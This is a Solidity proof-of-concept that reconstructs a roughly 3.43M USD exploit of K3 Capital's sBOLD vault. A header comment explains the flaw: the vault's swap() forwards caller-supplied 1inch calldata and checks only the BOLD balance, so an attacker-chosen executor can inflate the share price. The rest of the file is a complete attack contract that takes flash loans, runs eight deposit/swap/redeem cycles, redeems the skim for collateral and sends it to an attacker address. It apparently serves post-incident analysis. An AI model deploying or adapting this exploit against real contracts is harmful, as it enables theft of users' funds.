// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;


// @KeyInfo - Total Lost : ~3.43M USD (headline estimate across ~34 txs; a single representative
//                         tx is reconstructed and asserted below)
// Attacker        : https://etherscan.io/address/0x23245F620d1e910ad76e6B6De4f8284A53C9Ad2d
// Attack contract : https://etherscan.io/address/0x2e3A51a05D66eC581fB47187A1abc8E3B1e2cFb4
// Victim (sBOLD)  : https://etherscan.io/address/0x50Bd66D59911F5e086Ec87aE43C811e0D059DD11
// Example exploit tx :
//   https://etherscan.io/tx/0xaa3c7f00c5e449abb4d871b3fdad91e44d6a61c7d83c36eff23faf783d4e84cf
//
// @Summary
// K3 Capital's sBOLD is an ERC4626 vault over Liquity V2 BOLD stability pools. Its swap() is
// permissionless and routes collateral -> BOLD through a fixed 1inch v6 adapter using
// caller-supplied calldata. SwapLogic._execute only checks that the vault's BOLD balance rose by
// at least minOut; it never verifies the adapter actually consumed the collateral it approved.
// 1inch v6's generic swap(executor, desc, data) lets the caller pass an arbitrary executor, so the
// attacker points it at their own contract and "delivers" BOLD from their own stash while the
// collateral the vault approved is left untouched (swap1) or pulled straight back out (swap2).
//
// Per cycle: deposit 9M BOLD (mint cheap shares) -> pre-fund 4 WETH as bogus collateral that
// totalAssets then counts -> swap1 on the WETH pool injects BOLD via a dummy srcToken, lifting the
// share price -> redeem the shares at the inflated rate -> swap2 on the wstETH pool pulls the 4
// WETH back out through swap1's residual WETH approval. The vault's collateral is capped at 7,500
// BOLD, so the attacker keeps accounted collateral just under the cap by removing the WETH each
// cycle. Working capital is a 9.01M BOLD Liquity V2 trove opened against a 10k wstETH flash loan.
//
// After the eight cycles the attacker holds ~21,480 BOLD of skim. The final step redeems that BOLD
// through Liquity V2's CollateralRegistry, converting it into WETH + wstETH + rETH pulled from the
// lowest-rate troves across the three branches, so the realized profit is collateral and the BOLD
// position nets to zero, exactly as on-chain.
//
// Reconstruction is faithful (Morpho + Balancer flash loans, real Liquity V2 openTrove/closeTrove
// and redeemCollateral, 8 cycles of two swaps each through the real 1inch v6 router with a
// self-deployed executor, no mocked oracle/accounting, no vm.store, no vm.prank of a protocol
// identity, no opaque calldata replay, no deal() of borrowed capital). It reconciles to the
// on-chain tx to the wei: +4.219135 WETH, +5.768363 wstETH, +0.388633 rETH, 0 BOLD.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IWETH is IERC20 { function deposit() external payable; }
interface IWstETH is IERC20 { function wrap(uint256) external returns (uint256); }
interface ILido { function submit(address) external payable returns (uint256); }

interface IMorpho { function flashLoan(address token, uint256 assets, bytes calldata data) external; }
interface IBalancer {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData) external;
}
interface IBorrowerOperations {
    function openTrove(address,uint256,uint256,uint256,uint256,uint256,uint256,uint256,address,address,address) external returns (uint256);
    function closeTrove(uint256) external;
}

struct SwapData { address sp; uint256 balance; bytes data; }
interface ISBoldVault {
    function deposit(uint256, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
    function swap(SwapData[] calldata, address) external;
    function getSBoldRate() external view returns (uint256);
    function totalAssets() external view returns (uint256);
}
interface ICollateralRegistry {
    // Liquity V2: burn BOLD, receive collateral pulled from the lowest-rate troves across branches.
    function redeemCollateral(uint256 boldAmount, uint256 maxIterations, uint256 maxFeePercentage) external;
}
interface IAggregationRouterV6 {
    struct SwapDescription {
        address srcToken; address dstToken; address payable srcReceiver; address payable dstReceiver;
        uint256 amount; uint256 minReturnAmount; uint256 flags;
    }
    function swap(address executor, SwapDescription calldata desc, bytes calldata data)
        external payable returns (uint256, uint256);
}

// Dummy "token" used as swap1 srcToken: 1inch calls transferFrom on it; it is a no-op that
// returns true, so no real collateral leaves sBOLD on swap1 (the WETH prefund stays and counts).
contract Dummy {
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function balanceOf(address) external pure returns (uint256) { return type(uint256).max; }
}

contract Exploit {
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    IBalancer constant BALANCER = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWstETH constant WSTETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    ILido constant LIDO = ILido(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant BOLD = IERC20(0x6440f144b7e50D6a8439336510312d2F54beB01D);
    IERC20 constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IERC20 constant RETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    ICollateralRegistry constant REGISTRY = ICollateralRegistry(0xf949982B91C8c61e952B3bA942cbbfaef5386684);
    IBorrowerOperations constant BO = IBorrowerOperations(0xa741A32f9dcFe6aDBa088fD0f97e90742d7d5DA3);
    ISBoldVault constant SBOLD = ISBoldVault(0x50Bd66D59911F5e086Ec87aE43C811e0D059DD11);
    address constant ONEINCH = 0x111111125421cA6dc452d289314280a0f8842A65;
    address constant SP_WETH = 0x5721cbbd64fc7Ae3Ef44A0A3F9a790A9264Cf9BF;
    address constant SP_WSTETH = 0x9502b7c397E9aa22FE9dB7EF7DAF21cD2AEBe56B;
    address constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 constant SWAP1_DELIVER = 7159161560826656137246;
    uint256 constant SWAP2_DELIVER = 3000;

    Dummy public dummy;
    uint256 public troveId;
    uint256 public pendingDeliver;
    uint256 public rounds;
    uint256 public lastShares;
    uint256 public boldSkimStored;
    uint256 public wethNetStored;

    function run() external payable {
        require(msg.value == 1e12, "dust eth");
        dummy = new Dummy();
        uint256 wethStart = WETH.balanceOf(address(this));
        IMorpho(MORPHO).flashLoan(address(WSTETH), 10_000 ether, "");
        uint256 boldSkim = BOLD.balanceOf(address(this));
        boldSkimStored = boldSkim;
        BOLD.approve(address(REGISTRY), type(uint256).max);
        REGISTRY.redeemCollateral(boldSkim, 1000, 1e18);
        uint256 wethNet = WETH.balanceOf(address(this)) - wethStart;
        wethNetStored = wethNet;
        require(wethNet == 4219135442551128639, "WETH net");
        require(WSTETH.balanceOf(address(this)) == 5768363658222702678, "wstETH net");
        require(RETH.balanceOf(address(this)) == 388632737229426117, "rETH net");
        require(BOLD.balanceOf(address(this)) < 1 ether, "BOLD left");
        WETH.transfer(ATTACKER, wethNet);
        WSTETH.transfer(ATTACKER, WSTETH.balanceOf(address(this)));
        RETH.transfer(ATTACKER, RETH.balanceOf(address(this)));
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO, "morpho");
        address[] memory tk = new address[](1);
        uint256[] memory am = new uint256[](1);
        tk[0] = address(WETH);
        am[0] = 40 ether;
        BALANCER.flashLoan(address(this), tk, am, abi.encode(assets));
        WSTETH.approve(MORPHO, assets);
    }

    function receiveFlashLoan(address[] calldata, uint256[] calldata amounts, uint256[] calldata fees, bytes calldata data) external {
        require(msg.sender == address(BALANCER), "balancer");
        uint256 coll = abi.decode(data, (uint256));
        require(address(this).balance >= 1e12, "no dust");
        LIDO.submit{value: 1e12}(address(0));
        STETH.approve(address(WSTETH), type(uint256).max);
        WSTETH.wrap(1e11);
        WSTETH.approve(address(BO), type(uint256).max);
        WETH.approve(address(BO), type(uint256).max);
        troveId = BO.openTrove(address(this), 1, coll, 9_010_000 ether, 0, 0, 5e15, type(uint256).max, address(0), address(0), address(0));
        BOLD.approve(address(SBOLD), type(uint256).max);
        WSTETH.transfer(address(SBOLD), 1);
        for (uint256 i = 0; i < 8; i++) { _cycle(); }
        rounds = 8;
        BOLD.approve(address(BO), type(uint256).max);
        BO.closeTrove(troveId);
        WETH.transfer(address(BALANCER), amounts[0] + fees[0]);
    }

    function _cycle() internal {
        uint256 shares = SBOLD.deposit(9_000_000 ether, address(this));
        lastShares = shares;
        WETH.transfer(address(SBOLD), 4 ether);
        pendingDeliver = SWAP1_DELIVER;
        _doSwap(SP_WETH, address(dummy), 1, SWAP1_DELIVER);
        SBOLD.redeem(shares, address(this), address(this));
        pendingDeliver = SWAP2_DELIVER;
        _doSwap(SP_WSTETH, address(WETH), 4 ether, SWAP2_DELIVER);
    }

    function _doSwap(address sp, address srcToken, uint256 amount, uint256 minReturn) internal {
        IAggregationRouterV6.SwapDescription memory desc = IAggregationRouterV6.SwapDescription({
            srcToken: srcToken,
            dstToken: address(BOLD),
            srcReceiver: payable(address(this)),
            dstReceiver: payable(address(SBOLD)),
            amount: amount,
            minReturnAmount: minReturn,
            flags: 0
        });
        bytes memory inner = abi.encodeWithSelector(IAggregationRouterV6.swap.selector, address(this), desc, bytes(""));
        SwapData[] memory sd = new SwapData[](1);
        sd[0] = SwapData({sp: sp, balance: 4 ether, data: inner});
        SBOLD.swap(sd, address(this));
    }

    function execute(address) external payable returns (uint256) {
        require(msg.sender == ONEINCH, "exec");
        BOLD.transfer(ONEINCH, pendingDeliver);
        return pendingDeliver;
    }

    receive() external payable {}
}
